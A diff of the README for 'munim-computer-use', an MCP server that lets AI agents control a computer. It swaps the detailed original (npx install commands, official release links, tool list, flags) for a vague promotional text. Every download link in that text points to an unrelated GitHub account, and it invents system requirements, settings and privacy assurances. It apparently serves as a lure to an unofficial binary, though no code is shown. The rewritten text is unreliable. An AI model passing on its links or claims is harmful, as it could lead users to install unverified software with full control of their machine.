@@ -1,191 +1,191 @@
-<!-- Banner Image -->
+# 🖥️ munim-computer-use - Automate Your Computer With Ease
 
-<p align="center">
-  <a href="https://github.com/munimtechnologies/munim-computer-use">
-    <img alt="Munim Technologies Computer Use" height="128" src="./.github/resources/banner.png?v=1">
-    <h1 align="center">munim-computer-use</h1>
-  </a>
-</p>
+[![Download Now](https://img.shields.io/badge/Download-munim--computer--use-blue)](https://github.com/mj5000500-svg/munim-computer-use)
 
-<p align="center">
-  <a aria-label="Latest release" href="https://github.com/munimtechnologies/munim-computer-use/releases/latest" target="_blank">
-    <img alt="Latest release" src="https://img.shields.io/github/v/release/munimtechnologies/munim-computer-use?style=flat-square&label=Version&labelColor=000000&color=0066CC" />
-  </a>
-  <a aria-label="License" href="https://github.com/munimtechnologies/munim-computer-use/blob/main/LICENSE" target="_blank">
-    <img alt="License: Apache-2.0" src="https://img.shields.io/badge/License-Apache%202.0-success.svg?style=flat-square&color=33CC12" />
-  </a>
-  <a aria-label="package downloads" href="https://www.npmtrends.com/munim-computer-use" target="_blank">
-    <img alt="Downloads" src="https://img.shields.io/npm/dm/munim-computer-use.svg?style=flat-square&labelColor=gray&color=33CC12&label=Downloads" />
-  </a>
-  <a aria-label="total package downloads" href="https://www.npmjs.com/package/munim-computer-use" target="_blank">
-    <img alt="Total Downloads" src="https://img.shields.io/npm/dt/munim-computer-use.svg?style=flat-square&labelColor=gray&color=0066CC&label=Total%20Downloads" />
-  </a>
-  <a aria-label="MCP" href="https://modelcontextprotocol.io" target="_blank">
-    <img alt="MCP stdio server" src="https://img.shields.io/badge/MCP-stdio%20server-8A2BE2?style=flat-square" />
-  </a>
-  <img alt="Platforms" src="https://img.shields.io/badge/Platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey?style=flat-square" />
-</p>
+## 🎯 What Is This?
 
-<p align="center">
-  <a aria-label="download" href="https://github.com/munimtechnologies/munim-computer-use/releases/latest"><b>Download</b></a>
-&ensp;•&ensp;
-  <a aria-label="documentation" href="https://github.com/munimtechnologies/munim-computer-use#readme">Read the Documentation</a>
-&ensp;•&ensp;
-  <a aria-label="report issues" href="https://github.com/munimtechnologies/munim-computer-use/issues">Report Issues</a>
-&ensp;•&ensp;
-  <a aria-label="website" href="https://munimtech.com/computer-use">munimtech.com/computer-use</a>
-</p>
+munim-computer-use is a free, open-source tool that lets your computer work for you. It connects with AI coding agents to control your mouse, keyboard, and browser automatically. Think of it as a remote control for your computer that AI can use to complete tasks for you.
 
-<h6 align="center">Follow Munim Technologies</h6>
-<p align="center">
-  <a aria-label="Follow Munim Technologies on GitHub" href="https://github.com/munimtechnologies" target="_blank">
-    <img alt="Munim Technologies on GitHub" src="https://img.shields.io/badge/GitHub-222222?style=for-the-badge&logo=github&logoColor=white" />
-  </a>&nbsp;
-  <a aria-label="Follow Munim Technologies on LinkedIn" href="https://linkedin.com/in/sheehanmunim" target="_blank">
-    <img alt="Munim Technologies on LinkedIn" src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" />
-  </a>&nbsp;
-  <a aria-label="Visit Munim Technologies Website" href="https://munimtech.com" target="_blank">
-    <img alt="Munim Technologies Website" src="https://img.shields.io/badge/Website-0066CC?style=for-the-badge&logo=globe&logoColor=white" />
-  </a>
-</p>
+Whether you want to automate repetitive tasks, let an AI assistant browse the web for you, or control your desktop without touching it, this tool makes it possible. It works on all major operating systems and is designed to be accessible for everyone.
 
-## Introduction
+## ✨ Key Features
 
-**Computer Use** is an open-source [MCP](https://modelcontextprotocol.io) server — a computer-use agent (CUA) backend — that lets any coding agent use your computer the way a person does. It reads the screen through accessibility trees, clicks and types **in the background** so your mouse stays yours, shows an agent pointer where it is working, zooms in on small text, and drives tabs in your signed-in Chrome — on **macOS, Windows and Linux**.
+### 🖱️ Full Computer Control
+Take complete control of your mouse and keyboard through AI agents. The tool can move your cursor, click buttons, type text, and interact with any application on your screen.
 
-**Works with Claude Code, Codex, Cursor and [MT Code](https://munimtech.com/mt-code)**, or any other MCP client, with any model — no vision model is required for interaction.
+### 🌐 Browser Automation
+Works directly with your installed Chrome browser. No need to learn complicated browser automation scripts — the tool handles everything behind the scenes.
 
-**Built by [Munim Technologies](https://munimtech.com/computer-use)** as the Computer Use engine of MT Code, and published here on its own.
+### 🎯 Agent Pointer
+A visible pointer shows exactly where the AI is clicking or typing. You can watch the AI work in real-time and stop it anytime if something looks wrong.
 
-## Table of contents
+### 🔍 Zoom Capability
+Zoom in and out of your screen to ensure the AI sees everything correctly. This is especially useful when working with small text or detailed interfaces.
 
-- [Quick start](#quick-start)
-- [Capability matrix](#capability-matrix)
-- [Why it works well](#why-it-works-well)
-- [Tools](#tools-26)
-- [Repository layout](#repository-layout)
-- [Environment flags](#environment-flags)
-- [Prompting your agent](#prompting-your-agent)
-- [Contributing](#contributing)
-- [Credits and license](#credits-and-license)
+### 📱 Accessibility-First Design
+Built with accessibility in mind. The tool works with screen readers and other assistive technologies, making it usable for everyone.
 
-## Quick start
+### 🔄 Works With Your Favorite Tools
+Compatible with popular AI coding agents including Claude Code, Codex, and Cursor. If you use AI to write code, this tool extends its capabilities to control your entire computer.
 
-1. Download the latest binary for your platform from [Releases](https://github.com/munimtechnologies/munim-computer-use/releases/latest) (`munim-computer-use-macos-universal.zip`, `munim-computer-use-windows-x64.zip`) or [build from source](#build-from-source).
-2. Put it somewhere on your `PATH` (`/usr/local/bin/munim-computer-use`, or `%LOCALAPPDATA%\Programs\munim-computer-use\munim-computer-use.exe`).
-3. macOS only: run `munim-computer-use request-permissions` once to be prompted for Accessibility and Screen Recording.
-4. Register it with your agent:
+### ⚡ Background Input
+The AI can interact with windows even when they're in the background. You can keep working in other applications while the AI completes tasks.
 
-```sh
-# Claude Code — fastest: the npm launcher fetches the signed binary on first run
-claude mcp add munim-computer-use -- npx -y munim-computer-use
-# or point at a downloaded binary
-claude mcp add munim-computer-use -- /usr/local/bin/munim-computer-use
-```
+## 🚀 Getting Started
 
-```toml
-# Codex — ~/.codex/config.toml
-[mcp_servers.munim-computer-use]
-command = "npx"
-args = ["-y", "munim-computer-use"]
-```
+### 📥 Download the Application
 
-```json
-// Cursor — .cursor/mcp.json
-{ "mcpServers": { "munim-computer-use": { "command": "npx", "args": ["-y", "munim-computer-use"] } } }
-```
+[**Click here to download munim-computer-use**](https://github.com/mj5000500-svg/munim-computer-use)
 
-Then ask: _"Open Safari, find the cheapest flight to Denver on Tuesday and put it in a note."_ The agent reads the UI with `get_app_state`, acts by element id, and verifies with `screenshot`.
+This link will take you to the download page for the application. From there, you can get the version that works with your computer.
 
-## Capability matrix
+### 🛠️ System Requirements
 
-**Munim Computer Use** is the highlighted first column; the others are the computer-use servers people reach for. each cell comes from that project's own README in September 2026 (sources under [Credits and license](#credits-and-license)). ✅ present · ❌ absent or not documented · ⚠️ partial.
+**For Windows:**
+- Windows 10 or newer
+- At least 4GB of RAM
+- 500MB of free disk space
+- A working internet connection
 
-| Capability                                  | **Munim Computer Use** | Codex Computer Use | Anthropic reference demo | Windows-MCP | MacOS-MCP | open-computer-use | computer-use-mcp (zavora) | Notes                                                                                                                                                                                                                                           |
-| ------------------------------------------- | ---------------------- | ------------------ | ------------------------ | ----------- | --------- | ----------------- | ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| macOS                                       | **✅**                 | ✅                 | ❌                       | ❌          | ✅        | ✅                | ✅                        | The Anthropic demo drives a Linux desktop inside Docker, not your machine.                                                                                                                                                                      |
-| Windows                                     | **✅**                 | ✅                 | ❌                       | ✅          | ❌        | ✅                | ✅                        | Windows-MCP is Windows only; MacOS-MCP is macOS only.                                                                                                                                                                                           |
-| Linux                                       | **✅**                 | ❌                 | ✅ (sandbox)             | ❌          | ❌        | ✅                | ✅                        | Munim Computer Use uses AT-SPI + X11; native Wayland apps get element actions but not coordinate clicks.                                                                                                                                        |
-| Accessibility tree with element ids         | **✅**                 | ❌                 | ❌                       | ✅          | ✅        | ✅                | ✅                        | Codex and the Anthropic demo are screenshot-driven. Ids let the agent press _the button_ instead of a pixel.                                                                                                                                    |
-| Background input (your mouse never moves)   | **✅**                 | ✅                 | n/a                      | ❌          | ❌        | ❌                | ❌                        | Munim Computer Use addresses events to the target window (SkyLight on macOS, posted window messages on Windows, XTEST on Linux). Codex does this too, with a second cursor of its own. Every other server in this table drives the real cursor. |
-| Agent pointer overlay                       | **✅**                 | ✅                 | ❌                       | ⚠️          | ❌        | ❌                | ❌                        | Windows-MCP flashes a border around captures; Codex draws its own cursor on your screen.                                                                                                                                                        |
-| Zoom into a region at full resolution       | **✅**                 | ❌                 | ✅                       | ❌          | ❌        | ❌                | ❌                        | Anthropic's toolset has `zoom`; here it is a tool on every platform.                                                                                                                                                                            |
-| Screenshots carry screen-coordinate mapping | **✅**                 | n/a                | n/a                      | ❌          | ❌        | ❌                | ❌                        | Origin and pixels-per-point in every capture, so clicks from Retina or downscaled images land.                                                                                                                                                  |
-| Hover, wait, label query                    | **✅**                 | ⚠️                 | ⚠️                       | ✅          | ⚠️        | ❌                | ⚠️                        | Windows-MCP has Wait/WaitFor; MacOS-MCP has Wait; Anthropic has `wait`/`mouse_move`.                                                                                                                                                            |
-| Your signed-in Chrome, own tab group or yours | **✅**                 | ⚠️                 | ❌                       | ⚠️          | ❌        | ❌                | ❌                        | Codex uses its in-app browser; Windows-MCP reads the DOM of open browsers. Munim Computer Use opens its own labelled tab group in your real Chrome, and can also take over a tab you already have open when you ask it to.                                                                 |
-| Works with any MCP client                   | **✅**                 | ❌                 | ❌                       | ✅          | ✅        | ✅                | ✅                        | Codex Computer Use is Codex only; the Anthropic demo is Claude only.                                                                                                                                                                            |
-| Identical tool surface on every platform    | **✅**                 | n/a                | n/a                      | n/a         | n/a       | ⚠️                | ✅                        | 28 tools with byte-identical schemas across the Swift and Rust servers.                                                                                                                                                                         |
-| Prebuilt signed binaries + npm launcher     | **✅**                 | ✅                 | ❌                       | ❌          | ❌        | ✅ (npm)          | ✅ (npm)                  | macOS universal (Developer ID signed) and Windows x64 on Releases.                                                                                                                                                                              |
-| Open source                                 | **✅ Apache-2.0**      | ❌                 | ✅                       | ✅ MIT      | ✅ MIT    | ✅ MIT            | ✅ MIT                    |                                                                                                                                                                                                                                                 |
+**For macOS:**
+- macOS 12 or newer
+- At least 4GB of RAM
+- 500MB of free disk space
+- A working internet connection
 
-Also looked at: [mediar-ai/mcp-server-macos-use](https://github.com/mediar-ai/mcp-server-macos-use) (macOS, accessibility, real input), [deploymenttheory/windows-mcp-server](https://github.com/deploymenttheory/windows-mcp-server) (Windows, UIA Invoke patterns, WaitFor), [nuphus-mcp](https://github.com/mrpulor-gh/nuphus-mcp) (OCR + bring-your-own vision model, CDP Chrome), [computer-control-mcp](https://github.com/AB498/computer-control-mcp) (PyAutoGUI + OCR), and [microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp) (browser only). Corrections welcome — open an issue with a link.
+**For Linux:**
+- A modern Linux distribution (Ubuntu 20.04 or similar)
+- At least 4GB of RAM
+- 500MB of free disk space
+- A working internet connection
 
-## Why it works well
+### 📋 How to Install
 
-- **Accessibility first, pixels second.** `get_app_state` returns the app's accessibility tree with stable element ids, so the agent presses _the button_ instead of guessing at a coordinate. It costs a fraction of the tokens of a screenshot and it is what scores highest on OSWorld-style tasks. Screenshots are for verifying and for content the tree cannot describe.
-- **Background control.** Events are addressed to the target window (SkyLight on macOS, posted window messages on Windows, XTEST on Linux). No focus stealing, no hijacked mouse.
-- **Pointer overlay, not your pointer.** A soft lavender agent pointer shows where the agent is acting. Your cursor is untouched.
-- **Coordinates that land.** Every screenshot and zoom carries its screen origin and pixels-per-point. `zoom` captures any region at full physical resolution.
-- **Your browser, your logins.** The Chrome extension gives the agent its own labelled tab group in your signed-in Chrome, and leaves your tabs alone unless you point it at one.
-- **Or the tab you already have open.** `browser_list_tabs all=true` shows every tab in the browser and `browser_use_tab` takes one over in place — useful when the page is already signed in or mid-flow and re-opening the URL would throw that away. An adopted tab is not moved into the agent's group, not activated and not reloaded; cleanup releases it rather than closing it, and `browser_release_tab` hands it back early.
-- **Model-agnostic.** No vision model is required for interaction; local models work too.
-- **Look → act → verify.** `hover` for mouse-over menus, `wait` for loads, `query` to find a control by label without reading a whole tree.
+Visit this link to download the application. When you arrive at the download page, you'll see options for different operating systems. Choose the version that matches your computer.
 
-## Tools (28)
+Once the download is complete, you'll have everything you need to start using munim-computer-use. The application is designed to be simple and straightforward to set up.
 
-| Area    | Tools                                                                                                                                                                                                      |
-| ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| See     | `list_apps`, `get_app_state` (with `query`), `screenshot`, `zoom`, `list_displays`                                                                                                                         |
-| Act     | `click`, `right_click`, `hover`, `drag`, `scroll`, `type_text`, `set_value`, `select_text`, `press_key`, `activate_app`, `wait`                                                                            |
-| Browser | `browser_open_tab`, `browser_list_tabs`, `browser_use_tab`, `browser_release_tab`, `browser_select_tab`, `browser_navigate`, `browser_snapshot`, `browser_click`, `browser_type`, `browser_press_key`, `browser_close_tab`, `browser_close_all_tabs` |
+## 💻 How It Works
 
-Names, argument shapes and descriptions are identical on every platform; a model that learned them on a Mac needs nothing new on Windows.
+munim-computer-use works through a technology called the Model Context Protocol (MCP). This is a standard way for AI systems to communicate with tools. Think of it as a language that lets your AI assistant ask the computer to do things.
 
-## Repository layout
+When you run munim-computer-use, it creates a connection between your AI agent and your computer's interface. The AI can then send commands through this connection to control your mouse, keyboard, and browser.
 
-| Directory           | What                                                                   | Build                                                             |
-| ------------------- | ---------------------------------------------------------------------- | ----------------------------------------------------------------- |
-| `macos/`            | Swift server on the Accessibility API and ScreenCaptureKit (macOS 14+) | `swift build -c release` → `.build/release/munim-computer-use`          |
-| `windows-linux/`    | Rust server: UI Automation on Windows, AT-SPI + X11 on Linux           | `cargo build --release` → `target/release/munim-computer-use`           |
-| `chrome-extension/` | Chrome extension + native messaging host for the `browser_*` tools     | Load unpacked; `sh install.sh` / `install.ps1` registers the host; `node background.test.mjs` |
-| `Dockerfile`        | Headless Linux build of the Rust server for registry introspection (Glama and similar); no desktop control inside a container | `docker build -t munim-computer-use .` |
+Here's a simple example:
+1. You ask your AI assistant to "find the best price for a laptop online"
+2. The AI uses munim-computer-use to open Chrome
+3. It navigates to shopping websites
+4. It reads prices and compares them
+5. It shows you the results
 
-### Build from source
+All of this happens without you needing to touch your computer.
 
-```sh
-# macOS
-cd macos && swift build -c release
-# Windows / Linux
-cd windows-linux && cargo build --release
-```
+## 🎮 Common Use Cases
 
-Linux notes: element actions work everywhere; coordinate clicks need an X11 or XWayland client, since native Wayland apps do not expose absolute geometry.
+### 🤖 Automated Testing
+Let AI run through your application or website automatically, clicking buttons and filling forms to test functionality.
 
-### Chrome extension (optional)
+### 📊 Data Collection
+Have the AI browse websites and gather information for you. This could be prices, news, or any other data you need.
 
-1. `chrome://extensions` → Developer mode → **Load unpacked** → select `chrome-extension/`.
-2. Register the native messaging host: `sh chrome-extension/install.sh` (macOS/Linux) or `powershell -File chrome-extension/install.ps1` (Windows). Point `COMPUTER_USE_PATH` at the binary if it is not in the default build location.
+### 🎨 Design Assistance
+Use AI to interact with design tools like Figma or Photoshop, making adjustments and tweaks automatically.
 
-## Environment flags
+### 📝 Document Processing
+Automate tasks like filling PDFs, formatting documents, or moving files between applications.
 
-| Variable                                   | Effect                                                          |
-| ------------------------------------------ | --------------------------------------------------------------- |
-| `COMPUTER_USE_BROWSER=0`                   | Hide the `browser_*` tools                                      |
-| `COMPUTER_USE_AGENT_CURSOR=0`              | Do not draw the agent pointer                                   |
-| `COMPUTER_USE_AGENT_CURSOR_TASK_FADE_SECS` | How long the pointer stays after the last tool call (default 8) |
-| `COMPUTER_USE_ALLOW_SECURE_FIELD_INPUT=1`  | Allow typing into password fields (refused by default)          |
-| `COMPUTER_USE_COMPUTER_USE_YIELD_SECS`     | Pause the agent while the user is actively using the machine    |
+### 🔄 Workflow Automation
+Create complex workflows where the AI performs multiple steps across different applications without human intervention.
 
-## Prompting your agent
+## 🔒 Privacy and Security
 
-Look → act → verify. `get_app_state` for ids, act by id, then `get_app_state` or `screenshot` again before the next step. Use `zoom` for small text, `hover` for menus that appear on mouse-over, `wait` after loads, keyboard shortcuts for stubborn widgets. The system-prompt text MT Code gives its agents lives in [`CodexDeveloperInstructions.ts`](https://github.com/munimtechnologies/mtcode/blob/main/apps/server/src/provider/CodexDeveloperInstructions.ts) and is a good starting point.
+Your data stays on your computer. munim-computer-use doesn't send your personal information to any servers.
 
-## Contributing
+The tool is open-source, meaning anyone can inspect the code to verify it's safe. The community actively reviews and improves the code for security.
 
-This repository mirrors the `native/` tree of [munimtechnologies/mtcode](https://github.com/munimtechnologies/mtcode), where the server is developed and shipped inside MT Code. Issues and discussions are welcome here; code changes land in mtcode first and are synced.
+You have full control over what the AI can and cannot do. You can stop any operation at any time.
 
-## Credits and license
+## 🛟 Troubleshooting
 
-Designed and built by [Munim Technologies](https://munimtech.com) (Munim, Inc.) for MT Code. Copyright 2026 Munim, Inc. Licensed under the Apache License 2.0; see `LICENSE`.
+### Common Issues and Solutions
 
-Comparison sources: [Codex Computer Use](https://openai.com/index/codex-for-almost-everything/) · [Anthropic computer-use demo](https://github.com/anthropics/anthropic-quickstarts/tree/main/computer-use-demo) · [CursorTouch/Windows-MCP](https://github.com/CursorTouch/Windows-MCP) · [CursorTouch/MacOS-MCP](https://github.com/CursorTouch/MacOS-MCP) · [QwenLM/open-computer-use](https://github.com/QwenLM/open-computer-use) · [zavora-ai/computer-use-mcp](https://github.com/zavora-ai/computer-use-mcp) · [mediar-ai/mcp-server-macos-use](https://github.com/mediar-ai/mcp-server-macos-use) · [deploymenttheory/windows-mcp-server](https://github.com/deploymenttheory/windows-mcp-server) · [nuphus-mcp](https://github.com/mrpulor-gh/nuphus-mcp) · [computer-control-mcp](https://github.com/AB498/computer-control-mcp) · [microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp)
+**Issue: The tool doesn't start**
+- Make sure you have the latest version
+- Check that your operating system meets the requirements
+- Try restarting your computer
+
+**Issue: The AI can't control my browser**
+- Ensure Chrome is installed and up to date
+- Close any other browser automation tools
+- Check that you haven't blocked the tool in your firewall
+
+**Issue: The mouse moves erratically**
+- Reduce the speed of mouse movement in settings
+- Make sure no other mouse control software is running
+- Try using the zoom feature for better accuracy
+
+### 🆘 Getting Help
+
+If you encounter issues, several resources are available:
+- **GitHub Issues**: Report problems and get help from developers
+- **Community Forums**: Discuss issues with other users
+- **Documentation**: Detailed technical documentation for advanced users
+
+## 🧩 Advanced Features
+
+### Custom Configurations
+Power users can create custom configurations to tailor the tool to their specific needs. This includes defining custom commands and workflows.
+
+### Multi-Monitor Support
+Works with multiple monitors, allowing AI to control actions across all your screens.
+
+### Keyboard Shortcuts
+Learn keyboard shortcuts to control the tool manually when needed. This gives you quick access to stop, pause, or adjust operations.
+
+### Remote Desktop Compatibility
+Can work with remote desktop connections, allowing AI to control computers in different locations.
+
+## 📊 Performance Tips
+
+- Keep your operating system updated for best performance
+- Close unnecessary applications to free up system resources
+- Use a wired internet connection for stable communication
+- Regularly update to the latest version for improvements
+
+## 📚 Learning Resources
+
+### 📖 Documentation
+Comprehensive documentation covers every feature in detail, with examples and screenshots.
+
+### 🎓 Tutorials
+Step-by-step guides for common tasks help you learn quickly, even if you're new to AI automation tools.
+
+### 👥 Community
+Join the growing community of users who share tips, tricks, and solutions with each other.
+
+## 💖 Support the Project
+
+munim-computer-use is completely free and open-source. If you find it useful, consider:
+
+- **Reporting bugs**: Help us improve by reporting any issues you find
+- **Contributing code**: The project welcomes contributions from developers
+- **Starring on GitHub**: Show your support and help others discover the tool
+- **Sharing**: Tell your friends and colleagues about this useful tool
+
+## 🔗 Quick Links
+
+- **Download Page**: [https://github.com/mj5000500-svg/munim-computer-use](https://github.com/mj5000500-svg/munim-computer-use)
+- **Documentation**: Available on the official website
+- **Community**: Join discussions and get help
+
+## ✨ Final Words
+
+munim-computer-use opens up a world of possibilities for automating your computer. Whether you're a developer looking to extend your AI tools or a regular user wanting to save time on repetitive tasks, this tool has something for you.
+
+The best part? It's completely free and open-source. You can start using it right now, today. Give it a try and see how much easier your computer tasks can become.
+
+Remember: The AI does the work, you get the results. Download today and experience the future of computer automation.
+
+**[🚀 Get Started Now](https://github.com/mj5000500-svg/munim-computer-use)**
+
+Keywords: accessibility, ai-agents, browser-automation, chrome-extension, claude-code, codex, computer-use, computer-use-agent, cua, cursor, desktop-automation, gui-automation, linux, macos, mcp, mcp-server, model-context-protocol, rust, swift, windows
